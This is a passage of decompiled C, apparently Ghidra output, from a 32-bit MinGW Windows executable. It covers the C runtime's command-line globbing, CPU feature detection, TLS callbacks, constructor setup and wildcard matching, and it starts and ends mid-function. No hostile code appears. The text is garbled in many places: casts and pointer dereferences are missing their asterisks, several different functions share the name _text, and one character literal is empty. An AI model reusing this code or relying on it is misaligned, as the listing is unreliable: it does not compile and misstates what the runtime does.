(undefined4 )((int)&uStackY_60 + iVar8) = 0x4024b6;
___mingw_glob((char **)(&stack0xffffffa4 + iVar8),(uint *)(&stack0xffffffa8 + iVar8),
*(undefined **)(&stack0xffffffac + iVar8),
*(char **)(&stack0xffffffb0 + iVar8));
}
__argc = local_28;
DAT_00408000 = local_24;
return local_24;
}
pcVar3 = pcVar3 + 1;
if (cVar1 == '?') goto LAB_004023d3;
if (cVar1 < '@') {
iVar7 = (int)uVar4 >> 1;
if (cVar1 != '\'') {
if (cVar1 == '') goto LAB_004023d3;
if (cVar1 != '\""') goto LAB_00402370;
if (iVar7 != 0) {
pcVar9 = pcVar6 + iVar7;
pcVar5 = pcVar6;
do {
pcVar11 = pcVar5 + 1;
*pcVar5 = '\\';
pcVar6 = pcVar9;
pcVar5 = pcVar11;
} while (pcVar11 != pcVar9);
}
if ((local_30 == 0x27) || ((uVar4 & 1) != 0)) break;
local_30 = local_30 ^ 0x22;
cVar1 = *pcVar3;
uVar4 = 0;
local_34 = 1;
goto joined_r0x0040223b;
}
if ((__CRT_glob & 0x10) == 0) {
LAB_00402370:
pcVar5 = pcVar6 + uVar4;
pcVar9 = pcVar6;
if (uVar4 != 0) {
do {
pcVar11 = pcVar6 + 1;
pcVar6 = '\\';
pcVar6 = pcVar11;
pcVar9 = pcVar5;
} while (pcVar11 != pcVar5);
}
if (local_30 == 0) {
if ((int )__mb_cur_max_exref == 1) {
if (((byte )((int *)pctype_exref + iVar10 * 2) & 0x40) == 0) goto LAB_004023be;
}
else {
*(undefined4 *)(&stack0xffffffa8 + iVar8) = 0x40;
*(int *)(&stack0xffffffa4 + iVar8) = iVar10;
local_44 = iVar10;
*(undefined4 )((int)&uStackY_60 + iVar8) = 0x4023b3;
iVar7 = __isctype((int )(&stack0xffffffa4 + iVar8),(int *)(&stack0xffffffa8 + iVar8))
;
iVar10 = local_44;
if (iVar7 == 0) {
LAB_004023be:
if (iVar10 != 9) goto LAB_004023c7;
}
}
if ((local_38 < pcVar9) || (local_34 != 0)) {
*pcVar9 = '\0';
*(undefined4 *)(&stack0xffffffac + iVar8) = 0;
*(undefined **)(&stack0xffffffb0 + iVar8) = local_2c;
uVar4 = local_3c;
*(uint *)(&stack0xffffffa8 + iVar8) = local_3c;
pcVar6 = local_38;
*(char **)(&stack0xffffffa4 + iVar8) = local_38;
(undefined4 )((int)&uStackY_60 + iVar8) = 0x402514;
___mingw_glob((char **)(&stack0xffffffa4 + iVar8),(uint *)(&stack0xffffffa8 + iVar8),
*(undefined **)(&stack0xffffffac + iVar8),
*(char ***)(&stack0xffffffb0 + iVar8));
local_34 = 0;
local_3c = uVar4 | 1;
uVar4 = 0;
}
else {
uVar4 = 0;
local_34 = 0;
pcVar6 = pcVar9;
}
}
else {
LAB_004023c7:
*pcVar9 = cVar1;
uVar4 = 0;
pcVar6 = pcVar9 + 1;
}
}
else {
if (iVar7 != 0) {
pcVar9 = pcVar6 + iVar7;
pcVar5 = pcVar6;
do {
pcVar11 = pcVar5 + 1;
*pcVar5 = '\\';
pcVar6 = pcVar9;
pcVar5 = pcVar11;
} while (pcVar11 != pcVar9);
}
if ((local_30 == 0x22) || ((uVar4 & 1) != 0)) {
*pcVar6 = '\'';
uVar4 = 0;
local_34 = 1;
pcVar6 = pcVar6 + 1;
}
else {
local_30 = local_30 ^ 0x27;
uVar4 = 0;
local_34 = 1;
}
}
goto LAB_00402230;
}
if (cVar1 == '\\') {
if (local_30 == 0x27) {
*pcVar6 = '\\';
pcVar6 = pcVar6 + 1;
}
else {
uVar4 = uVar4 + 1;
}
goto LAB_00402230;
}
if (cVar1 == '\x7f') {
LAB_004023d3:
if (uVar4 == 0) {
bVar2 = iVar10 == 0x7f || local_30 != 0;
goto LAB_0040234b;
}
bVar2 = iVar10 == 0x7f || local_30 != 0;
}
else {
if (cVar1 != '[') goto LAB_00402370;
if ((__CRT_glob & 0x20) != 0) goto LAB_004023d3;
bVar2 = true;
pcVar5 = pcVar6;
if (uVar4 == 0) goto LAB_00402362;
}
pcVar5 = pcVar6 + uVar4;
pcVar9 = pcVar6;
do {
pcVar6 = pcVar9 + 1;
*pcVar9 = '\\';
pcVar9 = pcVar6;
} while (pcVar6 != pcVar5);
LAB_0040234b:
pcVar5 = pcVar6;
if (bVar2) {
LAB_00402362:
pcVar6 = pcVar5 + 1;
*pcVar5 = '\x7f';
}
*pcVar6 = cVar1;
uVar4 = 0;
pcVar6 = pcVar6 + 1;
} while( true );
*pcVar6 = '\""';
uVar4 = 0;
local_34 = 1;
pcVar6 = pcVar6 + 1;
goto LAB_00402230;
}
// WARNING: Removing unreachable block (ram,0x00402644)
// WARNING: Removing unreachable block (ram,0x00402636)
// WARNING: Removing unreachable block (ram,0x0040258e)
// WARNING: Removing unreachable block (ram,0x0040257f)
// WARNING: Removing unreachable block (ram,0x0040260e)
// WARNING: Removing unreachable block (ram,0x00402616)
// WARNING: Removing unreachable block (ram,0x00402619)
// WARNING: Removing unreachable block (ram,0x00402621)
// WARNING: Removing unreachable block (ram,0x00402624)
// WARNING: Removing unreachable block (ram,0x00402629)
// WARNING: Globals starting with '' overlap smaller symbols at the same address
void ___cpu_features_init(void)
{
int *piVar1;
int iVar2;
uint *puVar3;
uint uVar4;
byte in_VIP;
byte in_ID;
undefined auStack_210 [520];
uVar4 = (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000;
if (((((uint)(((uVar4 ^ 0x200000) & 0x200000) != 0) * 0x200000 ^ uVar4) & 0x200000) != 0) &&
(piVar1 = (int *)cpuid_basic_info(0), *piVar1 != 0)) {
iVar2 = cpuid_Version_info(1);
uVar4 = *(uint )(iVar2 + 8);
____cpu_features = (uint)((uVar4 & 0x100) != 0);
if (((uint *)(iVar2 + 0xc) & 0x2000) != 0) {
____cpu_features = ____cpu_features | 0x80;
}
if ((uVar4 & 0x8000) != 0) {
____cpu_features = ____cpu_features | 2;
}
if ((uVar4 & 0x800000) != 0) {
____cpu_features = ____cpu_features | 4;
}
if ((uVar4 & 0x1000000) != 0) {
____cpu_features = ____cpu_features | 8;
_fxsave(auStack_210);
_fxrstor(auStack_210);
_fxsave(auStack_210);
LOCK();
UNLOCK();
_fxrstor(auStack_210);
}
puVar3 = (uint *)cpuid(0x80000000);
if (0x80000000 < puVar3) {
iVar2 = cpuid(0x80000001);
uVar4 = 0;
if ((int)(uint )(iVar2 + 8) < 0) {
uVar4 = 0x100;
}
if (((uint )(iVar2 + 8) & 0x40000000) != 0) {
uVar4 = uVar4 | 0x200;
}
____cpu_features = ____cpu_features | uVar4;
}
}
return;
}
void ___do_global_ctors(void)
{
int iVar1;
int iVar2;
iVar1 = 0;
do {
iVar2 = iVar1;
iVar1 = iVar2 + 1;
} while ((&_CTOR_LIST)[iVar2 + 1] != 0);
for (; iVar2 != 0; iVar2 = iVar2 + -1) {
((code *)(&_CTOR_LIST)[iVar2])();
}
_atexit((_func_4879 *)&___do_global_dtors);
return;
}
void ___main(void)
{
if (_bss != 0) {
return;
}
_bss = 1;
___do_global_ctors();
return;
}
undefined4 tls_callback_1(undefined4 param_1,int param_2)
{
if ((param_2 != 3) && (param_2 != 0)) {
return 1;
}
___mingw_TLScallback(param_1,param_2);
return 1;
}
// WARNING: Removing unreachable block (ram,0x004027a3)
// WARNING: Removing unreachable block (ram,0x004027a5)
// WARNING: Removing unreachable block (ram,0x004027af)
// WARNING: Removing unreachable block (ram,0x004027b1)
// WARNING: Removing unreachable block (ram,0x004027b8)
undefined4 ___dyn_tls_init_12(undefined4 param_1,int param_2)
{
if (__CRT_MT != 2) {
__CRT_MT = 2;
}
if ((param_2 != 2) && (param_2 == 1)) {
___mingw_TLScallback(param_1,1);
}
return 1;
}
void _text(void)
{
DWORD *pDVar1;
LPVOID pvVar2;
DWORD DVar3;
_EnterCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408070);
for (pDVar1 = _bss; pDVar1 != (DWORD *)0x0; pDVar1 = (DWORD *)pDVar1[2]) {
pvVar2 = _TlsGetValue_4(pDVar1);
DVar3 = _GetLastError_0();
if ((DVar3 == 0) && (pvVar2 != (LPVOID)0x0)) {
((code *)pDVar1[1])(pvVar2);
}
}
_LeaveCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408070);
return;
}
undefined4 __cdecl ___mingw_TLScallback(undefined4 param_1,int param_2)
{
if (param_2 != 1) {
if (param_2 == 0) {
if (DAT_0040806c != 0) {
_text();
}
if (DAT_0040806c == 1) {
DAT_0040806c = 0;
_DeleteCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408070);
}
}
else if ((param_2 == 3) && (DAT_0040806c != 0)) {
_text();
}
return 1;
}
if (DAT_0040806c == 0) {
_InitializeCriticalSection_4((LPCRITICAL_SECTION)&DAT_00408070);
}
DAT_0040806c = 1;
return 1;
}
void _text(char *param_1)
{
FILE *_File;
_File = (FILE *)(_iob_exref + 0x40);
_fwrite(""Mingw runtime failure:\n"",1,0x17,_File);
_vfprintf(_File,param_1,&stack0x00000008);
// WARNING: Subroutine does not return
_abort();
}
void __fastcall FUN_00402a80(size_t param_1,void *param_2)
{
LPCVOID in_EAX;
SIZE_T SVar1;
DWORD local_3c;
_MEMORY_BASIC_INFORMATION local_38;
SVar1 = _VirtualQuery_12(in_EAX,&local_38,0x1c);
if (SVar1 == 0) {
// WARNING: Subroutine does not return
_text("" VirtualQuery failed for %d bytes at address %p"");
}
if ((local_38.Protect == 0x40) || (local_38.Protect == 4)) {
_memcpy(in_EAX,param_2,param_1);
}
else {
_VirtualProtect_16(local_38.BaseAddress,local_38.RegionSize,0x40,&local_3c);
_memcpy(in_EAX,param_2,param_1);
if ((local_38.Protect != 0x40) && (local_38.Protect != 4)) {
_VirtualProtect_16(local_38.BaseAddress,local_38.RegionSize,local_3c,&local_3c);
return;
}
}
return;
}
// WARNING: Removing unreachable block (ram,0x00402ba8)
// WARNING: Removing unreachable block (ram,0x00402bb6)
// WARNING: Removing unreachable block (ram,0x00402bc4)
// WARNING: Removing unreachable block (ram,0x00402bd7)
// WARNING: Removing unreachable block (ram,0x00402b99)
// WARNING: Removing unreachable block (ram,0x00402c90)
// WARNING: Removing unreachable block (ram,0x00402c95)
// WARNING: Removing unreachable block (ram,0x00402c9b)
// WARNING: Removing unreachable block (ram,0x00402bdc)
// WARNING: Removing unreachable block (ram,0x00402d2b)
// WARNING: Removing unreachable block (ram,0x00402be8)
// WARNING: Removing unreachable block (ram,0x00402bf7)
// WARNING: Removing unreachable block (ram,0x00402cb0)
// WARNING: Removing unreachable block (ram,0x00402cbc)
// WARNING: Removing unreachable block (ram,0x00402cc2)
// WARNING: Removing unreachable block (ram,0x00402c1b)
// WARNING: Removing unreachable block (ram,0x00402d10)
// WARNING: Removing unreachable block (ram,0x00402c24)
// WARNING: Removing unreachable block (ram,0x00402c2d)
// WARNING: Removing unreachable block (ram,0x00402ce0)
// WARNING: Removing unreachable block (ram,0x00402ce9)
// WARNING: Removing unreachable block (ram,0x00402cef)
// WARNING: Removing unreachable block (ram,0x00402ca6)
// WARNING: Removing unreachable block (ram,0x00402c45)
// WARNING: Removing unreachable block (ram,0x00402c4a)
// WARNING: Removing unreachable block (ram,0x00402c52)
// WARNING: Removing unreachable block (ram,0x00402c80)
void __pei386_runtime_relocator(void)
{
if (_bss == 0) {
_bss = 1;
}
return;
}
uint ___chkstk_ms(undefined1 param_1)
{
uint in_EAX;
uint uVar1;
undefined4 *puVar2;
uint uStack_8;
puVar2 = (undefined4 *)&param_1;
uVar1 = in_EAX;
if (0xfff < in_EAX) {
do {
puVar2 = puVar2 + -0x400;
*puVar2 = *puVar2;
uVar1 = uVar1 - 0x1000;
} while (0x1000 < uVar1);
}
uStack_8 = in_EAX;
*(undefined4 *)((int)puVar2 - uVar1) = *(undefined4 *)((int)puVar2 - uVar1);
return uStack_8;
}
int __cdecl _chdir(char *_Path)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00402d6c. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _chdir(_Path);
return iVar1;
}
undefined4 __cdecl _fesetenv(int param_1)
{
if (param_1 == -3) {
_data = -1;
}
else {
if (param_1 == -4) {
_data = -2;
}
else {
if (param_1 == 0) {
param_1 = _data;
}
if (param_1 == -1) {
return 0;
}
if (param_1 != -2) {
return 0;
}
}
_fpreset();
}
return 0;
}
undefined4 __fastcall _text(undefined4 param_1,uint param_2)
{
char *pcVar1;
char *in_EAX;
uint uVar2;
char cVar3;
bool bVar4;
if (in_EAX == (char *)0x0) {
return 0;
}
uVar2 = 0;
do {
cVar3 = *in_EAX;
if (cVar3 == '\0') {
return 0;
}
while( true ) {
if (((((byte)(param_2 >> 5) ^ 1) & 1) == 0) || (cVar3 != '\x7f')) {
in_EAX = in_EAX + 1;
}
else {
pcVar1 = in_EAX + 1;
in_EAX = in_EAX + 2;
if (pcVar1 == '\0') {
return 0;
}
}
if (uVar2 != 0) break;
if (cVar3 == '') {
return 1;
}
if (cVar3 == '?') {
return 1;
}
bVar4 = cVar3 == '[';
cVar3 = *in_EAX;
uVar2 = (uint)bVar4;
if (cVar3 == '\0') {
return 0;
}
}
if ((1 < (int)uVar2) && (cVar3 == ']')) {
return 1;
}
uVar2 = uVar2 + (cVar3 != '!');
} while( true );
}
undefined4 FUN_00402e90(void)
{
int in_EAX;
void *pvVar1;
undefined4 uVar2;
int iVar3;
if (in_EAX == 0) {
return 0;
}
iVar3 = *(int *)(in_EAX + 0xc) + 1;
pvVar1 = _malloc(iVar3 * 4);
*(void **)(in_EAX + 8) = pvVar1;
uVar2 = 3;
if (pvVar1 != (void *)0x0) {
*(undefined4 *)(in_EAX + 4) = 0;
if (0 < iVar3) {
do {
iVar3 = iVar3 + -1;
*(undefined4 *)((int)pvVar1 + iVar3 * 4) = 0;
} while (iVar3 != 0);
}
uVar2 = 0;
}
return uVar2;
}
char * __fastcall FUN_00402f00(uint param_1,uint param_2)
{
uint uVar1;
char *in_EAX;
int iVar2;
int iVar3;
char cVar4;
uint _C;
uint uVar5;
char *pcVar6;
_C = (uint)*in_EAX;
if ((_C == 0x5d) || (uVar5 = _C, _C == 0x2d)) {
if (_C == param_2) {
pcVar6 = in_EAX + 1;
LAB_004030e0:
do {
cVar4 = *pcVar6;
if (cVar4 == ']') goto LAB_00403115;
if (cVar4 == '\x7f') {
if ((param_1 & 0x20) != 0) {
pcVar6 = pcVar6 + 1;
goto LAB_004030e0;
}
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
}
pcVar6 = pcVar6 + 1;
if (cVar4 == '\0') {
return (char *)0x0;
}
} while( true );
}
uVar5 = (uint)in_EAX[1];
in_EAX = in_EAX + 1;
}
do {
pcVar6 = in_EAX + 1;
if (uVar5 == 0x5d) {
return (char *)0x0;
}
if (uVar5 == 0x2d) {
if (in_EAX[1] != ']') {
uVar5 = (uint)in_EAX[1];
if (uVar5 == 0) {
return (char *)0x0;
}
pcVar6 = in_EAX + 2;
if ((int)_C < (int)uVar5) {
do {
uVar1 = _C + 1;
if ((param_1 & 0x4000) == 0) {
iVar2 = _tolower(_C);
iVar3 = _tolower(param_2);
if (iVar2 == iVar3) {
LAB_00403057:
goto LAB_00403062;
}
}
else if (~param_2 + uVar1 == 0) goto LAB_00403057;
_C = uVar1;
} while (uVar5 != uVar1);
}
else if ((int)uVar5 < (int)_C) {
do {
uVar1 = _C - 1;
if ((param_1 & 0x4000) == 0) {
iVar2 = _tolower(_C);
iVar3 = _tolower(param_2);
if (iVar2 == iVar3) {
LAB_00403178:
goto LAB_00403183;
}
}
else if ((1 - param_2) + uVar1 == 0) goto LAB_00403178;
_C = uVar1;
} while (uVar5 != uVar1);
}
goto LAB_00402f6b;
}
_C = 0x2d;
cVar4 = ']';
}
else {
if (uVar5 == 0) {
return (char *)0x0;
}
LAB_00402f6b:
if (uVar5 == 0x2f) {
return (char *)0x0;
}
if (uVar5 == 0x5c) {
return (char *)0x0;
}
cVar4 = *pcVar6;
_C = uVar5;
}
if ((param_1 & 0x4000) == 0) {
iVar2 = _tolower(_C);
iVar3 = _tolower(param_2);
if (iVar2 == iVar3) {
LAB_00402fb3:
goto LAB_00402fce;
}
}
else if (_C == param_2) goto LAB_00402fb3;
uVar5 = (uint)cVar4;
in_EAX = pcVar6;
} while( true );
LAB_00403183:
cVar4 = *pcVar6;
if (cVar4 == ']') {
LAB_004030ca:
return pcVar6 + 1;
}
if (cVar4 == '\x7f') {
if ((param_1 & 0x20) != 0) {
pcVar6 = pcVar6 + 1;
goto LAB_00403183;
}
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
}
pcVar6 = pcVar6 + 1;
if (cVar4 == '\0') {
return (char *)0x0;
}
goto LAB_00403183;
LAB_00403062:
cVar4 = *pcVar6;
while( true ) {
if (cVar4 == ']') goto LAB_004030ca;
if (cVar4 != '\x7f') goto LAB_0040306d;
if ((param_1 & 0x20) == 0) break;
pcVar6 = pcVar6 + 1;
cVar4 = *pcVar6;
}
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
LAB_0040306d:
pcVar6 = pcVar6 + 1;
if (cVar4 == '\0') {
return (char *)0x0;
}
goto LAB_00403062;
LAB_00402fce:
if (cVar4 == ']') {
LAB_00403115:
return pcVar6 + 1;
}
if (cVar4 == '\x7f') {
if ((param_1 & 0x20) == 0) {
cVar4 = pcVar6[1];
pcVar6 = pcVar6 + 1;
goto LAB_00402fc0;
}
}
else {
LAB_00402fc0:
if (cVar4 == '\0') {
return (char *)0x0;
}
}
pcVar6 = pcVar6 + 1;
cVar4 = *pcVar6;
goto LAB_00402fce;
}
int __fastcall FUN_004031c0(uint param_1,char *param_2)
{
char *in_EAX;
int iVar1;
int iVar2;
char cVar3;
int iVar4;
uint uVar5;
int _C;
char *pcVar6;
char *pcVar7;
char *pcVar8;
cVar3 = *in_EAX;
if (((*param_2 != '.') || (cVar3 == '.')) || (iVar4 = cVar3 + -0x2e, (param_1 & 0x10000) != 0)) {
pcVar8 = param_2 + 1;
while( true ) {
iVar4 = (int)cVar3;
pcVar6 = in_EAX + 1;
if (iVar4 == 0) break;
if (cVar3 == '?') {
if (pcVar8[-1] == '\0') {
return 0x3f;
}
}
else if (cVar3 == '[') {
uVar5 = (uint)pcVar8[-1];
if (uVar5 == 0) {
return 0x5b;
}
if (in_EAX[1] == '!') {
pcVar6 = in_EAX + 2;
pcVar7 = FUN_00402f00(param_1,uVar5);
if (pcVar7 == (char *)0x0) {
cVar3 = in_EAX[2];
if (cVar3 == ']') {
pcVar6 = in_EAX + 3;
cVar3 = in_EAX[3];
}
while (cVar3 != ']') {
if (cVar3 == '\x7f') {
if ((param_1 & 0x20) == 0) {
cVar3 = pcVar6[1];
pcVar6 = pcVar6 + 1;
goto LAB_00403380;
}
}
else {
LAB_00403380:
if (cVar3 == '\0') {
return 0x5d;
}
}
pcVar6 = pcVar6 + 1;
cVar3 = pcVar6;
}
pcVar6 = pcVar6 + 1;
}
}
else {
pcVar6 = FUN_00402f00(param_1,uVar5);
}
if (pcVar6 == (char )0x0) {
return 0x5d;
}
}
else {
if (cVar3 == '') {
cVar3 = in_EAX[1];
while (cVar3 == '') {
pcVar6 = pcVar6 + 1;
cVar3 = *pcVar6;
}
if (cVar3 != '\0') {
pcVar8 = pcVar8 + -1;
do {
iVar4 = FUN_004031c0(param_1 | 0x10000,pcVar8);
if (iVar4 == 0) {
return 0;
}
cVar3 = *pcVar8;
pcVar8 = pcVar8 + 1;
} while (cVar3 != '\0');
return iVar4;
}
return 0;
}
if ((((param_1 >> 5 ^ 1) & 1) == 0) || (iVar4 != 0x7f)) {
LAB_00403222:
pcVar7 = pcVar6;
}
else {
iVar4 = (int)in_EAX[1];
pcVar7 = in_EAX + 2;
if (iVar4 == 0) goto LAB_00403222;
}
_C = (int)pcVar8[-1];
if (pcVar8[-1] == '\0') {
_C = 0;
LAB_00403262:
return iVar4 - _C;
}
if ((param_1 & 0x4000) == 0) {
iVar1 = _tolower(iVar4);
iVar2 = _tolower(_C);
iVar1 = iVar1 - iVar2;
}
else {
iVar1 = iVar4 - _C;
}
pcVar6 = pcVar7;
if (iVar1 != 0) goto LAB_00403262;
}
cVar3 = pcVar6;
pcVar8 = pcVar8 + 1;
in_EAX = pcVar6;
}
iVar4 = -(int)pcVar8[-1];
}
return iVar4;
}
undefined4 __fastcall FUN_004033e0(undefined4 param_1,int param_2)
{
int iVar1;
int iVar2;
int iVar3;
undefined4 in_EAX;
void pvVar4;
pvVar4 = _realloc((void **)(param_2 + 8),
((int *)(param_2 + 0xc) + *(int *)(param_2 + 4)) * 4 + 8);
if (pvVar4 != (void *)0x0) {
iVar2 = *(int *)(param_2 + 4);
iVar3 = *(int *)(param_2 + 0xc);
*(void **)(param_2 + 8) = pvVar4;
iVar1 = iVar2 + 1;
*(int *)(param_2 + 4) = iVar1;
*(undefined4 *)((int)pvVar4 + (iVar2 + iVar3) * 4) = in_EAX;
*(undefined4 *)((int)pvVar4 + (iVar3 + iVar1) * 4) = 0;
return 0;
}
return 1;
}
void __fastcall FUN_00403440(undefined4 param_1,int param_2)
{
int *in_EAX;
undefined4 extraout_ECX;
undefined4 extraout_ECX_00;
if (*in_EAX != 0) {
FUN_00403440(param_1,param_2);
param_1 = extraout_ECX;
}
if ((in_EAX[2] != 0) && (param_2 != 0)) {
FUN_004033e0(param_1,param_2);
param_1 = extraout_ECX_00;
}
if (in_EAX[1] != 0) {
FUN_00403440(param_1,param_2);
}
_free(in_EAX);
return;
}
// WARNING: Unable to track spacebase fully for stack
// WARNING: Removing unreachable block (ram,0x00403cf8)
// WARNING: Type propagation algorithm not settling
uint __fastcall FUN_00403490(undefined *param_1,uint param_2,void *param_3)
{
undefined4 uVar1;
undefined4 *puVar2;
code *pcVar3;
void **ppvVar4;
char cVar5;
char *in_EAX;
uint uVar6;
void *pvVar7;
int iVar8;
size_t sVar9;
undefined4 *puVar10;
int iVar11;
char *pcVar12;
undefined *puVar13;
undefined4 *puVar14;
char **ppcVar15;
undefined4 extraout_ECX;
void *extraout_ECX_00;
void *extraout_ECX_01;
void *extraout_ECX_02;
void *extraout_ECX_03;
void *extraout_ECX_04;
void *extraout_ECX_05;
undefined4 extraout_ECX_06;
undefined4 extraout_ECX_07;
void *extraout_ECX_08;
void *extraout_ECX_09;
undefined4 extraout_ECX_10;
undefined4 extraout_EDX;
int extraout_EDX_00;
int iVar16;
char *pcVar17;
undefined4 *puVar18;
int *piVar19;
int **ppiVar20;
char *pcVar22;
uint uVar23;
char *pcVar24;
int *piVar25;
bool bVar26;
char *pcStackY_80;
size_t sStack_74;
char acStack_70 [15];
char local_61;
char *local_60;
undefined *local_5c;
undefined *local_58;
undefined *local_54;
undefined4 *local_50;
undefined4 *local_4c;
int *local_48;
undefined *local_44;
code *local_40;
char *local_3c;
char *local_38;
uint local_34;
undefined4 local_30;
undefined local_2c [8];
int *local_24;
undefined4 local_20;
char **ppcVar21;
local_40 = (code *)param_1;
local_34 = param_2;
if ((param_2 & 0x400) != 0) {
pcStackY_80 = (char *)0x40380b;
pcVar12 = in_EAX;
local_44 = &stack0xffffff84;
_strlen(in_EAX);
pcStackY_80 = (char *)0x403819;
uVar6 = ___chkstk_ms((char)pcVar12);
iVar11 = -uVar6;
pcVar12 = acStack_70 + iVar11;
local_3c = pcVar12;
cVar5 = *in_EAX;
pcVar17 = in_EAX;
LAB_00403829:
if (cVar5 == '\x7f') goto LAB_00403855;
while (pcVar22 = pcVar17, pcVar24 = pcVar12, cVar5 != '{') {
while( true ) {
pcVar12 = pcVar24 + 1;
pcVar17 = pcVar22 + 1;
*pcVar24 = cVar5;
if ((cVar5 == '\0') || (cVar5 == '{')) {
if (cVar5 != '{') goto LAB_004034aa;
local_38 = pcVar12;
goto LAB_00403875;
}
cVar5 = pcVar22[1];
if (cVar5 != '\x7f') break;
LAB_00403855:
cVar5 = pcVar17[1];
*pcVar12 = '\x7f';
if (cVar5 != '\0') {
pcVar12[1] = cVar5;
pcVar17 = pcVar17 + 2;
cVar5 = *pcVar17;
pcVar12 = pcVar12 + 2;
goto LAB_00403829;
}
pcVar24 = pcVar12 + 1;
pcVar22 = pcVar17 + 1;
cVar5 = '\0';
}
}
local_38 = pcVar12;
LAB_00403875:
iVar8 = 1;
pcVar12 = local_38;
LAB_0040387d:
cVar5 = pcVar17[1];
if (cVar5 == '\x7f') goto LAB_004038ab;
do {
pcVar17 = pcVar17 + 1;
pcVar22 = pcVar12;
while( true ) {
if ((cVar5 != '}') && ((cVar5 != ',' || (iVar8 != 1)))) {
if (cVar5 == '{') {
iVar8 = iVar8 + 1;
}
local_30 = (char *)CONCAT31(local_30.1_3,cVar5 != '\0');
pcVar12 = pcVar22 + 1;
*pcVar22 = cVar5;
if (cVar5 != '\0') goto LAB_0040387d;
pcVar22 = pcVar12;
if (cVar5 == '\0') {
return 1;
}
goto LAB_004039d0;
}
iVar8 = iVar8 + -1;
if (iVar8 == 0) {
pcVar12 = pcVar17;
if (cVar5 != ',') goto LAB_00403973;
iVar8 = 1;
pcVar24 = pcVar17;
goto LAB_00403930;
}
*pcVar22 = cVar5;
cVar5 = pcVar17[1];
pcVar12 = pcVar22 + 1;
if (cVar5 != '\x7f') break;
LAB_004038ab:
cVar5 = pcVar17[2];
*pcVar12 = '\x7f';
pcVar22 = pcVar12 + 2;
pcVar12[1] = cVar5;
if (cVar5 == '\0') {
pcVar12[2] = '\0';
return 1;
}
cVar5 = pcVar17[3];
pcVar17 = pcVar17 + 3;
}
} while( true );
}
LAB_004034aa:
local_5c = &stack0xffffff84;
pcStackY_80 = (char *)0x4034b5;
pcVar12 = in_EAX;
_strlen(in_EAX);
pcStackY_80 = (char *)0x4034c6;
uVar6 = ___chkstk_ms((char)pcVar12);
iVar11 = -uVar6;
ppiVar20 = (int **)(&stack0xffffff84 + iVar11);
*(undefined4 *)((int)&sStack_74 + iVar11) = extraout_EDX;
*(char **)(&stack0xffffff88 + iVar11) = in_EAX;
*(char **)(&stack0xffffff84 + iVar11) = acStack_70 + iVar11;
(undefined4 )((int)&pcStackY_80 + iVar11) = 0x4034dc;
pvVar7 = _memcpy((void **)(&stack0xffffff84 + iVar11),(void **)(&stack0xffffff88 + iVar11),
*(size_t *)((int)&sStack_74 + iVar11));
*(void **)(&stack0xffffff84 + iVar11) = pvVar7;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x4034e4;
local_30 = ___mingw_dirname((char **)(&stack0xffffff84 + iVar11));
local_20 = 0;
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x4034f8;
local_38 = (char *)FUN_00402e90();
uVar6 = local_34;
if (local_38 != (char *)0x0) {
return (uint)local_38;
}
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x40350f;
iVar8 = _text(extraout_ECX,uVar6);
if (iVar8 == 0) {
*(char **)(&stack0xffffff84 + iVar11) = local_30;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x4039fb;
_strlen((char **)(&stack0xffffff84 + iVar11));
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403a09;
uVar6 = ___chkstk_ms((&stack0xffffff84)[iVar11]);
iVar8 = -uVar6;
pcVar12 = acStack_70 + iVar8 + iVar11;
pcVar17 = local_30;
do {
cVar5 = *pcVar17;
if (cVar5 == '\x7f') {
cVar5 = pcVar17[1];
pcVar17 = pcVar17 + 1;
}
pcVar17 = pcVar17 + 1;
*pcVar12 = cVar5;
pcVar12 = pcVar12 + 1;
} while (cVar5 != '\0');
*(char **)(&stack0xffffff84 + iVar8 + iVar11) = acStack_70 + iVar8 + iVar11;
*(undefined4 )((int)&pcStackY_80 + iVar8 + iVar11) = 0x403a45;
pcVar12 = _strdup((char **)(&stack0xffffff84 + iVar8 + iVar11));
if (pcVar12 == (char *)0x0) {
return 1;
}
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403a57;
local_38 = (char *)FUN_004033e0(extraout_ECX_06,(int)local_2c);
}
else {
*(undefined **)(&stack0xffffff84 + iVar11) = local_2c;
pcVar3 = local_40;
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x40352c;
local_38 = (char )FUN_00403490(pcVar3,uVar6 | 0x8000,(void **)(&stack0xffffff84 + iVar11));
}
uVar6 = local_34;
if (local_38 != (char *)0x0) {
return (uint)local_38;
}
if ((in_EAX[1] == '/') || (bVar26 = in_EAX[1] == '\\', bVar26)) {
LAB_0040355b:
*(char **)(&stack0xffffff84 + iVar11) = local_30;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x403566;
sVar9 = _strlen((char **)(&stack0xffffff84 + iVar11));
local_3c = in_EAX + sVar9;
if (in_EAX < local_3c) {
local_61 = *local_3c;
if ((local_61 == '/') || (local_61 == '\\')) {
}
else {
do {
pcVar12 = local_3c + -1;
if (in_EAX == pcVar12) {
local_61 = local_3c[-1];
local_3c = pcVar12;
goto LAB_004035b9;
}
local_61 = local_3c[-1];
} while ((local_61 != '/') && (local_3c = pcVar12, local_61 != '\\'));
local_3c = pcVar12;
}
}
else {
local_61 = *local_3c;
}
LAB_004035b9:
if ((local_61 == '/') || (local_61 == '\\')) {
do {
cVar5 = local_61;
local_3c = local_3c + 1;
local_61 = *local_3c;
} while (local_61 == '/' || local_61 == '\\');
local_61 = cVar5;
local_60 = local_30;
}
else {
local_61 = '\\';
local_60 = local_30;
}
}
else {
iVar8 = 2;
pcVar12 = local_30;
pcVar17 = ""."";
do {
if (iVar8 == 0) break;
iVar8 = iVar8 + -1;
bVar26 = *pcVar12 == *pcVar17;
pcVar12 = pcVar12 + 1;
pcVar17 = pcVar17 + 1;
} while (bVar26);
if (!bVar26) goto LAB_0040355b;
if ((local_34 & 0x10) != 0) {
